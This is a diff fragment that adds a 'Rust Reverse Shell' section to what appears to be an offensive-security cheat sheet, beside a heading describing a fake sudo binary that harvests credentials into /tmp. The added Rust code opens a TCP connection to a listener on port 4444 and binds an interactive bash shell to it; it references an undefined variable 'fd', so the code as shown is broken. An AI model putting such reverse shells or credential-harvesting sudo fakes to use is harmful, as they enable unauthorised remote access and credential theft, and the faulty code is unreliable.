@@ -1441,6 +1441,27 @@ if (ip.proto == TCP) {
 }
 ```
 
+## Rust Reverse Shell
+
+```rust
+use std::net::TcpStream;
+use std::os::unix::io::{AsRawFd, FromRawFd};
+use std::process::{Command, Stdio};
+
+fn main() {
+    let sock = TcpStream::connect("localhost:4444").unwrap();
+    Command::new("/bin/bash")
+        .arg("-i")
+        .stdin(unsafe { Stdio::from_raw_fd(fd) })
+        .stdout(unsafe { Stdio::from_raw_fd(fd) })
+        .stderr(unsafe { Stdio::from_raw_fd(fd) })
+        .spawn()
+        .unwrap()
+        .wait()
+        .unwrap();
+}
+```
+
 ## Fake Sudo Program to Harvest Credentials
 
 Mimics legitimate Sudo binary to capture credentials and output to ```/tmp``` directory file.
